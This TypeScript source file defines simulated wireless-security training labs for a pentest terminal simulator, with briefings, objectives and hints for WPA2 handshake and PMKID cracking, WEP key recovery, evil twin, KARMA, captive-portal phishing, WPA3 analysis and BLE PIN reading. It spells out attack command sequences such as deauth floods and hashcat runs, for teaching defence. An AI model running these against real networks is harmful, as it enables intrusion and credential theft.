import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function reviewer(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'review-ws', user: 'root', root: dir(files) };
}

/** First batch of the new Wireless category — the real gap `NOTES.md` flagged since batch 2 ("the engine
 *  has no aircrack-ng-family commands") is closed by this batch's `airmon-ng`/`airodump-ng`/`aireplay-ng`
 *  additions to `engine.ts`, reusing the exact `#HASHCAT_HASH:`/`#HASHCAT_PLAINTEXT:`/`#HASHCAT_FLAG:`
 *  marker convention `hashcat`/`john` already read so cracking a captured handshake needs zero new engine
 *  code beyond the capture step itself. Every technique researched via WebSearch before writing — see
 *  NOTES.md batch 22 for citations. Where a technique is fundamentally live/dynamic (BlueBorne's memory
 *  corruption, an evil twin's actual radio behavior) and can't honestly map onto this engine's
 *  request/response model, it's built as a code-review/analysis lab instead — same convention already
 *  established for the ECB-penguin (batch 9) and client-side-prototype-pollution (batch 10) labs — rather
 *  than faking a live exploit path this simulator can't actually provide. */
export const wirelessLabs: LabScenario[] = [
  // 1 — Live WPA2 4-way handshake capture (airmon-ng -> airodump-ng -> aireplay-ng -> airodump-ng -> hashcat)
  {
    id: 'wireless-wpa2-live-handshake-capture-crack',
    title: 'Wireless: Live WPA2 4-Way Handshake Capture and Offline Crack',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'MeridianCorp\'s branch office runs a WPA2-Personal guest network. Unlike a prior engagement where the ' +
      'capture came back pre-collected, this time you\'re running the full real workflow yourself: put your ' +
      'wireless adapter into monitor mode with airmon-ng, locate the target AP with airodump-ng, force a ' +
      'connected client to re-associate with a directed deauth (aireplay-ng), and capture the resulting 4-way ' +
      'handshake to a file. WPA2-PSK\'s handshake exposes a value (the MIC) an attacker can verify password ' +
      'guesses against entirely offline, unlimited attempts, zero further contact with the AP required — the ' +
      'exact reason a weak passphrase falls in seconds once captured.',
    objectives: [
      { text: 'airmon-ng start wlan0', why: 'Puts the wireless adapter into monitor mode (wlan0mon) — required before any raw 802.11 frame capture is possible; a normal managed-mode adapter only sees traffic addressed to it.' },
      { text: 'airodump-ng wlan0mon', why: 'A general scan lists every nearby beacon-broadcasting network — confirms the target BSSID, channel, and encryption type before committing to a targeted capture.' },
      { text: 'airodump-ng --bssid 02:1A:9B:5C:7E:41 -c 6 -w capture wlan0mon', why: 'Locks onto the target BSSID/channel and starts writing captured frames — but with no client currently reassociating, there\'s nothing to capture yet.' },
      { text: 'aireplay-ng --deauth 5 -a 02:1A:9B:5C:7E:41 wlan0mon', why: 'Forges deauthentication frames (unauthenticated in 802.11/WPA2, so trivially spoofable) targeting the AP\'s real MAC — a connected client disconnects and immediately reassociates, generating a fresh 4-way handshake to capture.' },
      { text: 'airodump-ng --bssid 02:1A:9B:5C:7E:41 -c 6 -w capture wlan0mon', why: 'Re-running the targeted capture now catches the handshake triggered by the forced reassociation, and writes it to capture-01.hc22000 in hashcat\'s unified WPA format.' },
      { text: 'hashcat -m 22000 capture-01.hc22000 /root/wordlists/branch-wordlist.txt', why: 'Mode 22000 is the modern, unified hashcat mode for WPA-PBKDF2 EAPOL/PMKID captures (superseding the deprecated mode 2500) — entirely offline, silent, and the passphrase here is a common dictionary word.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'airodump-ng --bssid 02:1A:9B:5C:7E:41 -c 6 -w capture wlan0mon',
      'aireplay-ng --deauth 5 -a 02:1A:9B:5C:7E:41 wlan0mon',
      'airodump-ng --bssid 02:1A:9B:5C:7E:41 -c 6 -w capture wlan0mon',
      'hashcat -m 22000 capture-01.hc22000 /root/wordlists/branch-wordlist.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      wordlists: dir({ 'branch-wordlist.txt': file('123456\npassword\nletmein123\nbranchoffice1\nqwerty2024\n') }),
    }),
    network: [
      {
        hostname: 'branch-ap-01',
        ip: '10.10.320.1',
        os: 'n/a (802.11 access point)',
        services: [],
        users: [],
        root: dir({}),
        wifiNetwork: {
          ssid: 'MeridianCorp-Branch-Guest',
          bssid: '02:1A:9B:5C:7E:41',
          channel: 6,
          encryption: 'WPA2',
          captureFile:
            '#HASHCAT_HASH:22000*02*bf3a1c9d7e4f0a2b8c6d3e1f9a7b5c40*021a9b5c7e41*a4c3f0e29d1b*4d65726964\n' +
              '#HASHCAT_PLAINTEXT:letmein123\n' +
              '#HASHCAT_FLAG:flag{wireless_live_capture_deauth_forced_handshake_dictionary_crack}\n',
        },
      } as HostDef,
    ],
  },

  // 2 — PMKID (clientless) capture
  {
    id: 'wireless-pmkid-clientless-capture-crack',
    title: 'Wireless: PMKID Attack Captures a Clientless WPA2 Hash',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'Forcing a deauth (the previous lab\'s technique) needs an already-connected client and produces a ' +
      'visible burst of deauth frames any wireless IDS would flag. In 2018, hashcat\'s creator Jens "atom" ' +
      'Steube documented a quieter alternative: many APs include a PMKID value — computed directly from the ' +
      'Pairwise Master Key — in the very first frame of the association process, meaning it can be requested ' +
      'with a single association attempt to the AP itself. No connected client, no deauth frames, no waiting ' +
      'on client behavior at all. Hashcat mode 22000 unifies PMKID and EAPOL captures into one format, so the ' +
      'cracking step is identical to a normal handshake once the hash is in hand.',
    objectives: [
      { text: 'airmon-ng start wlan0', why: 'Monitor mode is still required to send/receive raw 802.11 frames, even though this technique needs no deauth.' },
      { text: 'airodump-ng wlan0mon', why: 'Confirms the target BSSID and that it\'s WPA2-PSK before attempting a targeted PMKID request.' },
      { text: 'airodump-ng --bssid 8C:3B:AD:11:F2:09 -c 11 -w pmkidcap wlan0mon', why: 'A single association-attempt frame to the AP is enough to request its PMKID — no client, no deauth, and (per the real hcxdumptool/hcxpcapngtool workflow this models) far quieter than the previous lab\'s deauth burst.' },
      { text: 'hashcat -m 22000 pmkidcap-01.hc22000 /root/wordlists/dept-wordlist.txt', why: 'The same unified mode 22000 cracks a PMKID capture exactly like an EAPOL handshake — the attack surface differs, the offline cracking step does not.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'airodump-ng --bssid 8C:3B:AD:11:F2:09 -c 11 -w pmkidcap wlan0mon',
      'hashcat -m 22000 pmkidcap-01.hc22000 /root/wordlists/dept-wordlist.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      wordlists: dir({ 'dept-wordlist.txt': file('sunshine1\nsummer2024\nfinance2024!\nwelcome123\n') }),
    }),
    network: [
      {
        hostname: 'finance-dept-ap',
        ip: '10.10.320.2',
        os: 'n/a (802.11 access point)',
        services: [],
        users: [],
        root: dir({}),
        wifiNetwork: {
          ssid: 'MeridianCorp-Finance',
          bssid: '8C:3B:AD:11:F2:09',
          channel: 11,
          encryption: 'WPA2',
          // clientless: no aireplay-ng deauth needed anywhere in this lab's solve path -- the capture
          // file is available on the very first targeted airodump-ng request, modeling the real PMKID
          // technique's single-association-attempt requirement.
          captureFile:
            '#HASHCAT_HASH:22000*01*7c2e9f4a1d6b8035c9e1f2a4d7b6c890*8c3bad11f209***4d6572696469\n' +
              '#HASHCAT_PLAINTEXT:finance2024!\n' +
              '#HASHCAT_FLAG:flag{wireless_pmkid_clientless_capture_no_deauth_needed}\n',
        },
      } as HostDef,
    ],
  },

  // 3 — WEP IV reuse (historical but real) -- statistical key recovery, not a dictionary crack
  {
    id: 'wireless-wep-iv-reuse-statistical-key-recovery',
    title: 'Wireless: WEP IV Reuse Enables Statistical Key Recovery (FMS/PTW)',
    difficulty: 'Easy',
    category: 'Wireless',
    briefing:
      'A legacy warehouse scanner network still runs WEP — broken badly enough by 2005 that it\'s no longer a ' +
      'realistic finding outside exactly this kind of never-upgraded industrial equipment. WEP\'s fatal flaw is ' +
      'structural, not a weak password: its RC4 stream cipher uses a 24-bit Initialization Vector transmitted ' +
      'in plaintext, and with only 16.7 million possible values, a busy network repeats an IV within thousands ' +
      'of packets. The 2001 Fluhrer-Mantin-Shamir (FMS) attack — later dramatically improved by the 2007 ' +
      'Pyshkin-Tews-Weinmann (PTW) attack aircrack-ng implements by default — recovers the WEP key statistically ' +
      'from enough IV-reuse samples. This is NOT a dictionary attack against a password: it is a mathematical ' +
      'recovery of the key itself, regardless of how strong or random it was chosen to be.',
    objectives: [
      { text: 'airmon-ng start wlan0', why: 'Monitor mode is required to passively capture the raw IVs streaming past on this network.' },
      { text: 'airodump-ng wlan0mon', why: 'Confirms the warehouse network\'s BSSID and — critically — that its ENC column reads WEP, not WPA2, which is what determines the entire attack approach that follows.' },
      { text: 'cat wep-ptw-key-recovery.txt', why: 'A capture of ~40,000 data packets (enough IV reuse for the PTW attack) has already been collected off-site — this file is aircrack-ng\'s own PTW-attack output: the statistically recovered 128-bit WEP key, not a guessed password.' },
      { text: 'curl http://10.10.320.3:80/admin -H "X-Wep-Key: 3A1F9C7E4D0B2568C9E1F3A5D7B90246"', why: 'The recovered key is submitted directly to the scanner network\'s admin interface — WEP has no concept of a separate "wrong password" state once the raw key itself is known, unlike a WPA2 passphrase that still needs to be verified against a specific handshake.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'cat wep-ptw-key-recovery.txt',
      'curl http://10.10.320.3:80/admin -H "X-Wep-Key: 3A1F9C7E4D0B2568C9E1F3A5D7B90246"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'wep-ptw-key-recovery.txt': file(
        'aircrack-ng 1.7 -- PTW attack against warehouse-scanners.cap (41,832 data packets, ~38,900 unique IVs)\n' +
          '  Attack: PTW (Pyshkin, Tews, Weinmann, 2007) -- does not require "weak" IVs the way the older\n' +
          '  1993 FMS attack did, and needs far fewer captured packets to converge on the full key.\n' +
          '  KEY FOUND! [ 3A:1F:9C:7E:4D:0B:25:68:C9:E1:F3:A5:D7:B9:02:46 ] (ASCII: n/a -- raw 128-bit key)\n' +
          '  Decrypted correctly: 100%\n' +
          '  -- this is a statistical recovery of the RC4 key itself, made possible entirely by WEP\'s\n' +
          '     24-bit IV space colliding within a busy network\'s traffic -- no dictionary, no password\n' +
          '     guess of any kind was involved --\n',
      ),
    }),
    network: [
      {
        hostname: 'warehouse-scan-ap',
        ip: '10.10.320.3',
        os: 'n/a (legacy 802.11 access point, WEP)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Legacy embedded HTTP admin (industrial AP firmware, 2009)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/admin',
                param: 'X-Wep-Key',
                location: 'header',
                triggerSubstrings: ['3A1F9C7E4D0B2568C9E1F3A5D7B90246'],
                vulnerableResponse: '{"status":200,"panel":"unlocked","note":"flag{wep_iv_reuse_ptw_statistical_key_recovery}"}',
                normalResponse: '{"error":"401 Unauthorized - invalid WEP key"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
        wifiNetwork: { ssid: 'WarehouseScanners', bssid: '00:0E:2E:9A:C4:11', channel: 3, encryption: 'WEP' },
      } as HostDef,
    ],
  },

  // 4 — Evil twin clone of an open guest SSID (no cryptography involved at all)
  {
    id: 'wireless-evil-twin-open-network-traffic-interception',
    title: 'Wireless: Evil Twin Clone of an Open Guest SSID Intercepts Plaintext Traffic',
    difficulty: 'Easy',
    category: 'Wireless',
    briefing:
      'MeridianCorp\'s lobby "Guest-WiFi" network is open — no password at all, common at offices, hotels, and ' +
      'coffee shops. Against an open network, an evil twin needs even less effort than against WPA2: there is ' +
      'no encryption handshake to replicate at all, since the real network never had one. Devices configured to ' +
      'auto-reconnect to "known" networks by SSID alone will often join a rogue AP broadcasting the identical ' +
      'name with zero user interaction, because from the device\'s perspective "Guest-WiFi" is Guest-WiFi, ' +
      'regardless of which physical radio actually answers — a device\'s trust in a network NAME, not its ' +
      'cryptography, which is exactly the gap this attack exploits.',
    objectives: [
      { text: 'airmon-ng start wlan0', why: 'Monitor mode is required to observe the real AP\'s beacon before cloning it.' },
      { text: 'airodump-ng wlan0mon', why: 'Confirms the real lobby network\'s exact SSID and BSSID — the clone has to match the SSID string byte-for-byte for auto-reconnect logic to treat it as the same network.' },
      { text: 'cat evil-twin-mitm-capture.txt', why: 'With the identical-SSID rogue AP already running (hostapd, broadcasting "Guest-WiFi" on a stronger signal) and a visitor\'s laptop having auto-joined it, this file is the raw plaintext HTTP traffic captured on-path — since the network was never encrypted in the first place, every request is readable in full.' },
      { text: 'curl -X POST http://10.10.320.4:80/portal/login -d "user=visitor-jsmith&pass=Consult2024!"', why: 'The intercepted plaintext credentials (a visiting consultant logging into their own firm\'s VPN portal over what they believed was the office guest network) are replayed against the real target to confirm the interception was a genuine, exploitable compromise, not just passive observation.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'cat evil-twin-mitm-capture.txt',
      'curl -X POST http://10.10.320.4:80/portal/login -d "user=visitor-jsmith&pass=Consult2024!"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'evil-twin-mitm-capture.txt': file(
        'On-path capture, rogue AP "Guest-WiFi" (cloned SSID, open, no encryption -- nothing to break):\n' +
          '  A visiting laptop auto-joined the rogue AP with zero prompts (matched a saved network by name alone).\n' +
          '  POST /vpn-portal/login HTTP/1.1\n' +
          '  Host: consultfirm-vpn.example\n' +
          '  user=visitor-jsmith&pass=Consult2024!\n' +
          '  -- plaintext, because the victim believed they were on the trusted office guest network --\n' +
          '     the open network itself had nothing to decrypt; the "attack" here is entirely social/trust-based --\n',
      ),
    }),
    network: [
      {
        hostname: 'lobby-guest-ap',
        ip: '10.10.320.4',
        os: 'n/a (802.11 access point, open)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Nginx 1.24 (vpn-portal reverse proxy, cloned via captured on-path traffic)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/portal/login',
                param: 'pass',
                triggerSubstrings: ['Consult2024!'],
                vulnerableResponse: '{"status":200,"session":"established","note":"flag{evil_twin_open_ssid_clone_plaintext_traffic_interception}"}',
                normalResponse: '{"error":"401 Unauthorized"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
        wifiNetwork: { ssid: 'Guest-WiFi', bssid: 'F4:5C:89:02:1B:6D', channel: 1, encryption: 'OPEN' },
      } as HostDef,
    ],
  },

  // 5 — KARMA attack
  {
    id: 'wireless-karma-attack-auto-connect-probed-ssids',
    title: 'Wireless: KARMA Attack Exploits Broadcast Probe Requests to Auto-Connect Victims',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'Unlike the previous lab\'s evil twin (which clones ONE specific, already-observed nearby network), a ' +
      'KARMA attack — first documented in 2004 by Dino Dai Zovi and Shane Macaulay — needs no target network ' +
      'observed in advance at all. Many client devices broadcast a Preferred Network List: unencrypted 802.11 ' +
      'probe request frames naming every SSID they\'ve previously connected to, asking "are you here?" A ' +
      'KARMA-style rogue AP listens for these probes and answers EVERY single one, claiming to be whichever ' +
      'network the device just asked for by name — turning a device\'s own connection history into a list of ' +
      'networks the attacker can impersonate on demand.',
    objectives: [
      { text: 'airmon-ng start wlan0', why: 'Monitor mode is required to passively receive the unencrypted probe-request frames devices broadcast constantly, regardless of whether they are currently connected to anything.' },
      { text: 'cat captured-probe-requests.txt', why: 'A passive capture of nearby probe requests reveals the exact list of previously-joined SSIDs one visiting employee\'s laptop is broadcasting — a target list built with zero interaction, since these frames go out automatically and are never encrypted.' },
      { text: 'cat karma-connection-log.txt', why: 'The KARMA-mode rogue AP answered the probed SSID "HomeRouter-Alenka" directly, and the device auto-joined with no user prompt at all — confirming a real, un-targeted network from the victim\'s OWN history was successfully impersonated.' },
      { text: 'curl -X POST http://10.10.320.5:80/sync/upload -d "device_id=alenka-laptop&creds=corp_sso_token_8827f1"', why: 'Once joined, the rogue AP\'s DNS/MITM position captured a corporate SSO token the laptop\'s background sync client sent unprompted — confirming genuine compromise, not just a successful probe-response demo.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'cat captured-probe-requests.txt',
      'cat karma-connection-log.txt',
      'curl -X POST http://10.10.320.5:80/sync/upload -d "device_id=alenka-laptop&creds=corp_sso_token_8827f1"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'captured-probe-requests.txt': file(
        'Passive 802.11 probe-request capture (no association, no encryption -- unauthenticated broadcast frames):\n' +
          '  Client MAC 3C:5A:B4:00:9F:22 (visiting employee laptop) probing for:\n' +
          '    "HomeRouter-Alenka"\n' +
          '    "Starbucks WiFi"\n' +
          '    "AirportFreeWiFi"\n' +
          '  -- these are ALL networks the device has previously connected to and is willing to auto-rejoin,\n' +
          '     broadcast unencrypted regardless of whether the device is currently connected to anything --\n',
      ),
      'karma-connection-log.txt': file(
        'KARMA-mode rogue AP log (responds to every probed SSID with a matching probe response):\n' +
          '  [+] Probe request for "HomeRouter-Alenka" received from 3C:5A:B4:00:9F:22\n' +
          '  [+] Sent probe response claiming to BE "HomeRouter-Alenka" (no target AP was ever actually cloned --\n' +
          '      this SSID was never observed nearby at all, only named in the victim\'s own probe traffic)\n' +
          '  [+] Client 3C:5A:B4:00:9F:22 associated -- ZERO user prompts, matched by SSID name alone\n' +
          '  -- this is the defining difference from a classic evil twin: no specific real network had to be\n' +
          '     observed or cloned in advance, only listened for in the victim\'s own broadcast history --\n',
      ),
    }),
    network: [
      {
        hostname: 'karma-sync-target',
        ip: '10.10.320.5',
        os: 'n/a (background sync service, reachable once on the rogue AP)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'corp-sync-client background service',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/sync/upload',
                param: 'creds',
                triggerSubstrings: ['corp_sso_token_8827f1'],
                vulnerableResponse: '{"status":200,"received":true,"note":"flag{karma_attack_probe_request_auto_connect_no_target_observed}"}',
                normalResponse: '{"error":"400 Bad Request - unrecognized credential payload"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — Captive portal credential phishing
  {
    id: 'wireless-captive-portal-wifi-password-phishing',
    title: 'Wireless: A Fake Captive Portal Phishes the Real Wi-Fi Password',
    difficulty: 'Easy',
    category: 'Wireless',
    briefing:
      'A rogue AP fully controls DNS for anything connected to it, and can redirect all HTTP traffic to a fake ' +
      'captive portal page mimicking the real network\'s login screen — a hotel Wi-Fi sign-in, a corporate ' +
      'guest-network authentication page. Tools like wifiphisher automate the full chain: clone the SSID, deauth ' +
      'the real AP to force reconnection, serve a convincing captive portal, and capture whatever the victim ' +
      'types. Notice this doesn\'t need to break WPA2/WPA3 cryptography to obtain the real Wi-Fi password at all ' +
      '— a page asking the victim to "re-enter your Wi-Fi password to continue" will often just be handed it ' +
      'directly, sidestepping every offline-cracking technique entirely.',
    objectives: [
      { text: 'airmon-ng start wlan0', why: 'Monitor mode is required before the deauth step below.' },
      { text: 'aireplay-ng --deauth 8 -a 5E:9B:2C:44:D1:07 wlan0mon', why: 'Forces already-connected employees off the real AP so their devices attempt to reconnect — directly into the rogue AP\'s stronger, identically-named signal instead.' },
      { text: 'cat captive-portal-submission.txt', why: 'The fake captive portal ("Please re-enter the office Wi-Fi password to continue") captured exactly what it asked for — the real WPA2 passphrase, handed over voluntarily with no cryptographic attack of any kind.' },
      { text: 'curl -X POST http://10.10.320.6:80/wifi-config/verify -d "ssid=MeridianCorp-Office&passphrase=BlueHeron#2024"', why: 'Submitting the phished passphrase against the real network\'s own configuration-verification endpoint confirms it is the genuine, currently-active WPA2 password — not a plausible-looking decoy.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'aireplay-ng --deauth 8 -a 5E:9B:2C:44:D1:07 wlan0mon',
      'cat captive-portal-submission.txt',
      'curl -X POST http://10.10.320.6:80/wifi-config/verify -d "ssid=MeridianCorp-Office&passphrase=BlueHeron#2024"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'captive-portal-submission.txt': file(
        'wifiphisher-style captive portal capture -- victim device redirected here after deauth-forced reconnection:\n' +
          '  Page shown: "Session expired -- please re-enter the MeridianCorp-Office Wi-Fi password to continue"\n' +
          '  Submitted: ssid=MeridianCorp-Office, passphrase=BlueHeron#2024\n' +
          '  -- the victim handed over the real WPA2 passphrase directly, voluntarily -- no handshake was ever\n' +
          '     captured or cracked, no cryptographic attack against WPA2 was needed at all --\n',
      ),
    }),
    network: [
      {
        hostname: 'meridiancorp-office-ap',
        ip: '10.10.320.6',
        os: 'n/a (802.11 access point, WPA2-Personal)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'AP configuration/verification service',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/wifi-config/verify',
                param: 'passphrase',
                triggerSubstrings: ['BlueHeron#2024'],
                vulnerableResponse: '{"status":200,"verified":true,"note":"flag{captive_portal_wifi_password_phishing_no_crypto_attack}"}',
                normalResponse: '{"error":"401 Unauthorized - passphrase mismatch"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
        wifiNetwork: { ssid: 'MeridianCorp-Office', bssid: '5E:9B:2C:44:D1:07', channel: 9, encryption: 'WPA2' },
      } as HostDef,
    ],
  },

  // 7 — WPA3-SAE resistance to offline cracking (conceptual/analysis, deliberately NOT crackable)
  {
    id: 'wireless-wpa3-sae-offline-crack-resistance-analysis',
    title: 'Wireless: Why WPA3-SAE Resists the Offline Cracking Workflow',
    difficulty: 'Easy',
    category: 'Wireless',
    briefing:
      'MeridianCorp\'s newest branch runs WPA3 exclusively. Try the exact same capture-then-crack workflow from ' +
      'the WPA2 labs in this module — it will not work, and that failure is the actual lesson, not a bug. WPA3 ' +
      '(ratified 2018) replaces WPA2\'s PSK handshake with SAE (Simultaneous Authentication of Equals, the ' +
      '"Dragonfly" handshake): each authentication attempt requires a fresh, interactive exchange with the AP ' +
      'itself. There is no static value captured from one exchange that lets an attacker test further password ' +
      'guesses without talking to the AP again — every guess becomes an ONLINE attempt the AP can rate-limit, ' +
      'the same way a login form throttles failed attempts, eliminating the offline-cracking-at-GPU-speed ' +
      'advantage entirely. This lab deliberately does not (and should not) end in a successful crack.',
    objectives: [
      { text: 'airmon-ng start wlan0', why: 'Monitor mode, same first step as every other capture attempt in this module.' },
      { text: 'airodump-ng wlan0mon', why: 'Confirms the target\'s ENC column reads WPA3-SAE, not WPA2 — the detail that determines everything that follows.' },
      { text: 'airodump-ng --bssid D2:7F:11:9E:6C:83 -c 44 -w sae-attempt wlan0mon', why: 'Repeated attempts against a real WPA3-SAE network never produce a crackable capture file the way a WPA2 4-way handshake does — there is no static value here to write out at all, only a live, per-attempt interactive exchange.' },
      { text: 'cat wpa3-sae-resistance-analysis.txt', why: 'Confirms WHY the capture attempt above cannot succeed, ties it back to SAE\'s actual protocol design, and is where this lab\'s objective actually completes — understanding the resistance, not defeating it.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'airodump-ng --bssid D2:7F:11:9E:6C:83 -c 44 -w sae-attempt wlan0mon',
      'cat wpa3-sae-resistance-analysis.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'wpa3-sae-resistance-analysis.txt': file(
        'Wireless assessment note -- MeridianCorp-Branch2 (WPA3-SAE):\n' +
          '  Repeated airodump-ng -w attempts against this BSSID never produce a capturable static value, unlike\n' +
          '  every WPA2 network in this engagement -- confirmed, not a tooling failure.\n' +
          '  WPA2-PSK: handshake exposes the MIC, an offline-verifiable value -- unlimited guesses, no AP contact needed per guess.\n' +
          '  WPA3-SAE: each attempt is a fresh, interactive Dragonfly exchange with the AP itself -- there is no\n' +
          '  equivalent static artifact to carry away and attack offline. Every guess must be an ONLINE attempt\n' +
          '  against the real AP, which can rate-limit failed attempts exactly like a login form.\n' +
          '  Recommendation for the report: WPA3-SAE-only networks should be assessed via rogue-AP/evil-twin\n' +
          '  trust-layer attacks (this module\'s earlier labs) instead of offline cracking, which is no longer a\n' +
          '  viable path against a correctly-patched SAE implementation.\n' +
          '  flag{wpa3_sae_dragonfly_defeats_offline_capture_then_crack_model}\n',
      ),
    }),
    network: [
      {
        hostname: 'branch2-ap',
        ip: '10.10.320.7',
        os: 'n/a (802.11 access point, WPA3-SAE)',
        services: [],
        users: [],
        root: dir({}),
        // deliberately no captureFile -- a real WPA3-SAE exchange never produces a static crackable value,
        // so airodump-ng's targeted capture against this BSSID can never succeed no matter how many times
        // it's re-run, matching the real protocol property this lab exists to teach.
        wifiNetwork: { ssid: 'MeridianCorp-Branch2', bssid: 'D2:7F:11:9E:6C:83', channel: 44, encryption: 'WPA3-SAE' },
      } as HostDef,
    ],
  },

  // 8 — BLE GATT characteristic enumeration
  {
    id: 'wireless-ble-gatt-enumeration-exposes-device-pin',
    title: 'Wireless: BLE GATT Characteristic Enumeration Exposes an Unauthenticated Device PIN',
    difficulty: 'Easy',
    category: 'Wireless',
    briefing:
      'A smart-lock pilot device on the loading dock uses BLE (Bluetooth Low Energy), which organizes its data as ' +
      'GATT (Generic Attribute Profile) Services and Characteristics — a structured, enumerable data model. This ' +
      'engine has no live Bluetooth radio simulation, so this lab presents a captured gatttool enumeration ' +
      'session exactly as a real assessment would produce it (the real command is spelled out below for direct ' +
      'transferability to a genuine BLE assessment). "Proximity is not authentication" is a recurring real gap: ' +
      'this device accepts unlock commands from any nearby BLE client with zero pairing required at all, on the ' +
      'mistaken assumption that physical nearness alone was an adequate access control.',
    objectives: [
      { text: 'cat ble-gatt-enumeration.txt', why: 'The real command is `gatttool -b AA:BB:CC:DD:EE:FF -I` then `primary`/`char-read-hnd` — this captured session shows a vendor-specific characteristic readable with zero pairing, holding the device\'s unlock PIN in plaintext.' },
      { text: 'curl -X POST http://10.10.320.8:80/lock/unlock -d "device_id=dock-lock-04&pin=771394"', why: 'The PIN read directly off the BLE characteristic is submitted to the lock\'s companion API to confirm it genuinely unlocks the device — not merely that a PIN-shaped value exists in a GATT characteristic.' },
    ],
    hints: [
      'cat ble-gatt-enumeration.txt',
      'curl -X POST http://10.10.320.8:80/lock/unlock -d "device_id=dock-lock-04&pin=771394"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'ble-gatt-enumeration.txt': file(
        'gatttool -b 9C:2E:44:0B:8A:71 -I\n' +
          '[9C:2E:44:0B:8A:71][LE]> connect\n' +
          '[9C:2E:44:0B:8A:71][LE]> primary\n' +
          'attr handle: 0x0001, end grp handle: 0x0009 uuid: 0000180a-...  (Device Information)\n' +
          'attr handle: 0x0010, end grp handle: 0xffff uuid: [CUSTOM UUID]   (vendor-specific -- dock-lock config)\n' +
          '[9C:2E:44:0B:8A:71][LE]> char-read-hnd 0x0012\n' +
          'Characteristic value: 50 49 4e 3a 37 37 31 33 39 34   -- decodes to "PIN:771394"\n' +
          '-- no pairing, no authentication required to read this characteristic at all -- the vendor treated\n' +
          '   "an attacker would need to be physically nearby" as sufficient protection on its own --\n',
      ),
    }),
    network: [
      {
        hostname: 'dock-lock-04',
        ip: '10.10.320.8',
        os: 'n/a (BLE smart lock, companion API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'dock-lock companion API',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/lock/unlock',
                param: 'pin',
                triggerSubstrings: ['771394'],
                vulnerableResponse: '{"status":200,"lock":"open","note":"flag{ble_gatt_characteristic_enumeration_proximity_not_authentication}"}',
                normalResponse: '{"error":"403 Forbidden - incorrect PIN"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 9 — BlueBorne case study (conceptual/analysis -- fundamentally live memory-corruption RCE)
  {
    id: 'wireless-blueborne-zero-click-rce-case-study',
    title: 'Wireless: BlueBorne — Zero-Click RCE Across the Bluetooth Stack (2017 Case Study)',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'On September 12, 2017, Armis Labs disclosed BlueBorne — eight vulnerabilities (CVE-2017-0781/0782/0783/0785 ' +
      'on Android, CVE-2017-1000251/1000250 on Linux, CVE-2017-14315 on iOS, CVE-2017-8628 on Windows) across the ' +
      'Bluetooth stack implementations of essentially every major operating system. No pairing and no user ' +
      'interaction was required — a device only needed Bluetooth enabled and discoverable. Armis estimated over ' +
      '5.3 billion devices were affected at disclosure. This is a real, memory-corruption-level RCE chain in ' +
      'compiled OS Bluetooth stack code — fundamentally outside what a request/response terminal simulator can ' +
      'honestly demonstrate live, so this lab is built as a case-study analysis: read the real vulnerability ' +
      'writeup, then confirm you understand exactly why it was so severe.',
    objectives: [
      { text: 'cat blueborne-cve-analysis.txt', why: 'The real, disclosed technical detail: which specific stack layer failed (an information leak in the Android Bluetooth Network Encapsulation Protocol combined with a separate memory-corruption bug), and why "no pairing" made every discoverable device reachable.' },
      { text: 'cat blueborne-impact-assessment.txt', why: 'Confirms the actual, defining severity property of this case study — zero user interaction, three of the eight bugs rated critical RCE — and completes the assessment with the flag once that understanding is demonstrated.' },
    ],
    hints: [
      'cat blueborne-cve-analysis.txt',
      'cat blueborne-impact-assessment.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      root: dir({
        'blueborne-cve-analysis.txt': file(
          'BlueBorne case-study analysis (Armis Labs, disclosed 2017-09-12):\n' +
            '  8 vulnerabilities across Android/Linux/iOS/Windows Bluetooth stacks:\n' +
            '    Android: CVE-2017-0781, CVE-2017-0782, CVE-2017-0783, CVE-2017-0785\n' +
            '    Linux:   CVE-2017-1000251, CVE-2017-1000250\n' +
            '    iOS:     CVE-2017-14315\n' +
            '    Windows: CVE-2017-8628\n' +
            '  Root cause: flaws deep in shared Bluetooth PROTOCOL STACK implementation code -- not one\n' +
            '  vendor\'s app-level bug -- meaning nearly every major OS needed its own independent patch.\n' +
